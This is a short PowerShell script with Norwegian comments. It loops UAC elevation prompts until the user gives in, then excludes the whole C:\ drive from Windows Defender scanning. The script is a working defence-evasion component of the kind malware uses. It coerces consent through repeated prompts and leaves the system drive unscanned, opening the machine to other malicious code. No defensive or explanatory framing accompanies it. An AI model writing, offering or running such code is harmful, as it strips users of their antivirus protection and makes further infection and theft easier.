while ($true) {
    try {
        # Forsøk å starte PowerShell med admin-rettigheter
        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Set-MpPreference -ExclusionPath C:\`""
        Write-Host "Admin-rettigheter gitt! C:\ er nå ekskludert fra Windows Defender."
        exit # Avslutt scriptet etter at ekskluderingen er satt
    } catch {
        # Hvis brukeren trykker "Nei", prøv igjen
        Write-Host "Du må godkjenne UAC for å fortsette..."
        Start-Sleep -Seconds 2
    }
}
